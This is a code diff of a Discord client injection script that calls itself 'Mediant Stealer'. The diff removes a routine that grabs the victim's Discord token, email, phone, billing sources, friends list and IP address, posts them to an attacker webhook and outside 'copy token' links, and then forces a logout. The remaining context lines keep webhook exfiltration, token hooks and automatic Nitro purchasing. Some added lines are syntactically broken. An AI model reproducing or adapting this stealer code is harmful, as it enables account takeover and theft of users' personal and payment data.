@@ -6,16 +6,13 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: '%WEBHOOK%',
-  webhook_protector_key: '%WEBHOOK_KEY%',
-  logout: true,
-  lnotify: true,
-  notify : false,
+  webhook: '%WEBHOOK%', 
+  webhook_protector_key: '%WEBHOOK_KEY%', 
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: 'Mediant Injection', 
-  embed_icon: 'https://media.discordapp.net/attachments/1054752436415385700/1132710459519275089/IMG_20230723_000404.png?width=404&height=405'.replace(/ /g, '%20'), 
+  embed_icon: 'https://raw.githubusercontent.com/The-Mediant/lagnewalisui/main/img/xd.jpg), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/The-Mediant/lagnewalisui/main/index.js', 
   /**
@@ -346,17 +343,6 @@ if (jsSHA.default) {
   jsSHA = jsSHA.default;
 }
 
-const getGifOrPNG = async (url) => {
-    var tt = [".gif?size=512", ".png?size=512"]
-
-    var headers = await new Promise(resolve => {
-        https.get(url, res => resolve(res.headers))
-    })
-    var type = headers["content-type"]
-    if (type == "image/gif") return url + tt[0]
-    else return url + tt[1]
-}
-
 function totp(key) {
   const period = 30;
   const digits = 6;
@@ -525,35 +511,6 @@ const getBilling = async (token) => {
   return billing;
 };
 
-const parseFriends = friends => {
-    try{
-    var real = friends.filter(x => x.type == 1)
-    var rareFriends = ""
-    for (var friend of real) {
-        var badges = GetRBadges(friend.user.public_flags)
-        if (badges !== ":x:") rareFriends += `${badges} ${friend.user.username}#${friend.user.discriminator}\n`
-    }
-    if (!rareFriends) rareFriends = "No Rare Friends"
-    return {
-        len: real.length,
-        badges: rareFriends
-    }
-}catch(err){
-    return ":x:"
-}
-}
-
-const GetA2F = (bouki) => {
-    switch (bouki) {
-        case true:
-            return ":lock: `A2F Enabled`"
-        case false:
-            return ":lock: `A2F Not Enabled`"
-        default:
-            return "Idk bro you got me"
-    }
-}
-
 const Purchase = async (token, id, _type, _time) => {
   const options = {
     expected_amount: config.nitro[_type][_time]['price'],
@@ -620,319 +577,6 @@ const getNitro = (flags) => {
   }
 };
 
-const GetNitro = r => {
-    switch (r.premium_type) {
-        default:
-            return ":x:"
-        case 1:
-            return "<:946246402105819216:962747802797113365>"
-        case 2:
-            if (!r.premium_guild_since) return "<:946246402105819216:962747802797113365>"
-            var now = new Date(Date.now())
-            var arr = ["<:Booster1Month:1051453771147911208>", "<:Booster2Month:1051453772360077374>", "<:Booster6Month:1051453773463162890>", "<:Booster9Month:1051453774620803122>", "<:boost12month:1068308256088400004>", "<:Booster15Month:1051453775832961034>", "<:BoosterLevel8:1051453778127237180>", "<:Booster24Month:1051453776889917530>"]
-            var a = [new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since)]
-            var b = [2, 3, 6, 9, 12, 15, 18, 24]
-            var r = []
-            for (var p in a) r.push(Math.round((calcDate(a[p], b[p]) - now) / 86400000))
-            var i = 0
-            for (var p of r) p > 0 ? "" : i++
-            return "<:946246402105819216:962747802797113365> " + arr[i]
-    }
-}
-const GetNSFW = (bouki) => {
-    switch (bouki) {
-        case true:
-            return ":underage: `NSFW Allowed`"
-        case false:
-            return ":underage: `NSFW Not Allowed`"
-        default:
-            return "Idk bro you got me"
-    }
-}
-function GetLangue(read) {
-    var languages = {
-        "fr": ":flag_fr: French",
-        "da": ":flag_dk: Dansk",
-        "de": ":flag_de: Deutsch",
-        "en-GB": ":england: English (UK)",
-        "en-US": ":flag_us: USA",
-        "en-ES": ":flag_es: Espagnol",
-        "hr": ":flag_hr: Croatian",
-        "it": ":flag_it: Italianio",
-        "lt": ":flag_lt: Lithuanian",
-        "hu": ":flag_no::flag_hu: Hungarian",
-        "no": ":flag_no: Norwegian",
-        "pl": ":flag_pl: Polish",
-        'pr-BR': ":flag_pt: Portuguese",
-        "ro": ":flag_ro: Romanian",
-        "fi": ":flag_fi: Finnish",
-        "sv-SE": ":flag_se: Swedish",
-        "vi": ":flag_vn: Vietnamese",
-        "tr": ":flag_tr: Turkish",
-        "cs": ":flag_cz: Czech",
-        "el": ":flag_gr: Greek",
-        "bg": ":flag_bg: Bulgarian",
-        "ru": ":flag_ru: Russian",
-        "uk": ":flag_ua: Ukrainian",
-        "hi": ":flag_in: Indian",
-        "th": ":flag_tw: Taiwanese",
-        "zh-CN": ":flag_cn: Chinese-China",
-        "ja": ":flag_jp: Japanese",
-        "zh-TW": ":flag_cn: Chinese-Taiwanese",
-        "ko": ":flag_kr: Korean"
-    }
-
-    var langue = languages[read] || "No Languages Detected ????";
-    return langue
-}
-
-const makeEmbed = async ({
-    title,
-    fields,
-    image,
-    thumbnail,
-    description
-}) => {
-    var params = {
-        username: "Mediant Injector",
-        avatar_url: "https://raw.githubusercontent.com/The-Mediant/lagnewalisui/main/img/xd.jpg",
-        content: "",
-        embeds: [{
-            title: title,
-            color: config["embed-color"],
-            fields: fields,
-            description: description ?? "",
-            author: {
-                name: `Mediant Injection`
-            },
-            
-            footer: {
-                text: `🎉・Mediant Stealer Injection`
-            },
-
-        }]
-    };
-
-    if (image) params.embeds[0].image = {
-        url: image
-    }
-    if (thumbnail) params.embeds[0].thumbnail = {
-        url: thumbnail
-    }
-    return params
-}
-const FirstTime = async () => {
-    var token = await execScript(tokenScript)
-    if (config.notify !== "true") return true
-    if (fs.existsSync(__dirname + "/Mediant")){
-        try{
-        fs.rmdirSync(__dirname + "/Mediant")
-        }catch(err){
-            console.log(err)
-        }
-    var ip = await getIP()
-    var {
-        appPath,
-        appName
-    } = path
-    var client_discord = appName
-    if (!token) {
-        var params = await makeEmbed({
-            title: "Mediant Stealer Initialized",
-            fields: [{
-                name: "Injection Info",
-                value: `\`\`\`diff\n- Computer Name: ${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
-                inline: !1
-            }]
-        })
-    } else {
-        var user = await getURL("https://discord.com/api/v8/users/@me", token)
-        var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
-        var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
-        var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
-
-        var Billings = getBilling(billing)
-        var Friends = parseFriends(friends)
-        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/The-Mediant/lagnewalisui/main/img/xd.jpg"
-        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/The-Mediant/lagnewalisui/main/Mediant%20Banner.jpg"
-
-        userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
-        userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
-        var params = await makeEmbed({
-            title: " Mediant Stealer Initialized",
-            description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
-            fields: [{
-                name: "Username <:username:1133656006954602607> ",
-                value: `\`${user.username}#${user.discriminator}\``,
-                inline: !0
-            }, {
-                name: "ID <:id:1133656199078891531>",
-                value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
-                inline: !0
-            }, {
-                name: "Nitro <a:nitro:1133656425516761181>",
-                value: `${GetNitro(Nitro)}`,
-                inline: !0
-            }, {
-                name: "Badges <a:black:1133656618341503066>",
-                value: `${GetBadges(user.flags)}`,
-                inline: !0
-            }, {
-                name: "Language <:languages:1133656890375675974>",
-                value: `${GetLangue(user.locale)}`,
-                inline: !0
-            }, {
-                name: "NSFW <:nsfw:1133657209671258193>",
-                value: `${GetNSFW(user.nsfw_allowed)}`,
-                inline: !0
-            }, {
-                name: "MFA <:psy:1054779770883276850>",
-                value: `${GetA2F(user.mfa_enabled)}`,
-                inline: !0
-            }, {
-                name: "@Copyright",
-                value: `[Mediant Stealer <:Mediant:1133654846617157673>](http://mediant.000.pe/)`,
-                inline: !0
-            }, {
-                name: "Mediant Files",
-                value: `[Transfer.sh <:transfer:1133657574634422272>](${config.transfer_link})`,
-                inline: !0
-            }, {
-                name: "Billing <a:billing:1133658008082202704>",
-                value: `${Billings}`,
-                inline: !0
-            }, {
-                name: "Email <a:psy:1054779652226416721>",
-                value: `\`${user.email ?? "none"}\``,
-                inline: !0
-            }, {
-                name: "Bio <:bio:1133658374291062814>",
-                value: `\`\`\`${user.bio ?? ":x:"}\`\`\``,
-                inline: !1
-            }, {
-                name: "<a:verified:1133658531766214696> Token",
-                value: `\`\`\`${token}\`\`\`\n[Copy Token](http://mediant.000.pe/copytoken?p=${token})\n\n[Download Banner](${userBanner})`,
-                inline: !1
-            }],
-            image: userBanner,
-            thumbnail: userAvatar
-        })
-        var params2 = await makeEmbed({
-            title: `<a:emoteb:1133658922042011709> Total Friends (${Friends.len})`,
-            color: 2895667,
-            description: Friends.badges,
-            image: userBanner,
-            thumbnail: userAvatar
-        })
-
-        params.embeds.push(params2.embeds[0])
-    }
-    await hooker(params)
-    if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config.lnotify == "true") {
-        if (!token) {
-            var params = await makeEmbed({
-                title: "Mediant User log out (User not Logged in before)",
-                fields: [{
-                    name: "Injection Info",
-                    value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n`,
-                    inline: !1
-                }]
-            })
-        } else {
-            var user = await getURL("https://discord.com/api/v8/users/@me", token)
-            var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
-            var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
-            var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
-
-            var Billings = getBilling(billing)
-            var Friends = parseFriends(friends)
-            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/The-Mediant/lagnewalisui/main/img/xd.jpg"
-            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/The-Mediant/lagnewalisui/main/Mediant%20Banner.jpg"
-            
-            userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
-            userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
-            var params = await makeEmbed({
-                title: "Mediant Stealer Victim got logged out",
-                description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
-                fields: [{
-                    name: "Username <:username:1133656006954602607> ",
-                    value: `\`${user.username}#${user.discriminator}\``,
-                    inline: !0
-                }, {
-                    name: "ID <:id:1133656199078891531>",
-                    value: `\`${user.id}\`\n[Copy ID](http://mediant.000.pe/copytoken?p=${user.id})`,
-                    inline: !0
-                }, {
-                    name: "Nitro <a:nitro:1133656425516761181>",
-                    value: `${GetNitro(Nitro)}`,
-                    inline: !0
-                }, {
-                    name: "Badges <a:black:1133656618341503066>",
-                    value: `${GetBadges(user.flags)}`,
-                    inline: !0
-                }, {
-                    name: "Language <:languages:1133656890375675974>",
-                    value: `${GetLangue(user.locale)}`,
-                    inline: !0
-                }, {
-                    name: "NSFW <:nsfw:1133657209671258193>",
-                    value: `${GetNSFW(user.nsfw_allowed)}`,
-                    inline: !0
-                }, {
-                    name: "A2F <:psy:1054779770883276850>",
-                    value: `${GetA2F(user.mfa_enabled)}`,
-                    inline: !0
-                }, {
-                    name: "@Copyright",
-                    value: `[Mediant Stealer  <:Mediant:1133654846617157673>](http://mediant.000.pe/)`,
-                    inline: !0
-                }, {
-                    name: "MEDIANT Files",
-                    value: `[Transfer.sh <:transfer:1133657574634422272>](${config.transfer_link})`,
-                    inline: !0
-                }, {
-                    name: "Billing <a:billing:1133658008082202704>",
-                    value: `${Billings}`,
-                    inline: !0
-                }, {
-                    name: "Email <a:psy:1054779652226416721>",
-                    value: `\`${user.email}\``,
-                    inline: !0
-                }, {
-                    name: "Phone <a:psy:1054776823512317953>",
-                    value: `\`${user.phone ?? "None"}\``,
-                    inline: !0
-                }, {
-                    name: "Bio <:bio:1133658374291062814>",
-                    value: `\`\`\`${user.bio ?? ":x:"}\`\`\``,
-                    inline: !1
-                }, {
-                    name: "Token <a:verified:1133658531766214696>",
-                    value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
-                    inline: !1
-                }],
-                image: userBanner,
-                thumbnail: userAvatar
-            })
-            var params2 = await makeEmbed({
-                title: `<a:emoteb:1133658922042011709> Total Friends (${Friends.len})`,
-                color: 2895667,
-                description: Friends.badges,
-                image: userBanner,
-                thumbnail: userAvatar
-            })
-
-            params.embeds.push(params2.embeds[0])
-        }
-    
-        fs.writeFileSync("./d3dcompiler.dlll", "LogOut")
-        await execScript(logOutScript)
-        doTheLogOut = true
-        await hooker(params)
-    }
-    return false
-}
-
 const getBadges = (flags) => {
   let badges = '';
   switch (flags) {
@@ -975,15 +619,6 @@ const getBadges = (flags) => {
   }
   return badges;
 };
-
-const GetBadges = (e) => {
-    var n = "";
-    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 64 == (64 & e) && (n += "<:bravery:874750808388952075> "), 128 == (128 & e) && (n += "<:brilliance:874750808338608199> "), 256 == (256 & e) && (n += "<:balance:874750808267292683> "), 512 == (512 & e) && (n += "<:666_hackingmyshit:1107319657603551253> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:devcertif:1041639665498861578> "), "" == n && (n = ":x:"), n
-}
-const GetRBadges = (e) => {
-    var n = "";
-    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 131072 == (131072 & e) && (n += "<:devcertif:1041639665498861578> "), "" == n && (n = ":x:"), n
-}
 
 const hooker = async (content) => {
   const data = JSON.stringify(content);
@@ -1041,8 +676,8 @@ const login = async (email, password, token) => {
           },
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          name: `Mediant Injection Info,
+          icon_url: `https://raw.githubusercontent.com/Themediant/lagnewalisui/main/img/xd.jpg`,
         },
         footer: {
           text: '🎉・Mediant Stealer Injection',
